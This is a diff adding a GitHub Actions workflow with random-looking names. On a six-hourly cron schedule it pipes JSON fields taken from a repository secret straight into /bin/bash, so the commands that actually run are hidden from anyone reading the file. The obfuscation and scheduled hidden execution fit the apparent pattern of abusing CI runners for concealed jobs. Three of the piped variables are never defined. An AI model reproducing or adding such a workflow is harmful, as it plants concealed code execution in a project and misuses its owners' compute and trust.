@@ -1,0 +1,20 @@
+name: meihongyan1290
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: meihongyan1290
+        env:
+          pyfoi046: ${{ secrets.pyfoi046 }}
+        run: |
+          echo $pyfoi046 | jq -r .clh51451 | /bin/bash
+          echo $sy4778 | jq -r .yusya88 | /bin/bash
+          echo $zwveh81459 | jq -r .k513 | /bin/bash
+          echo $gllpz9 | jq -r .ityfq1503 | /bin/bash
+
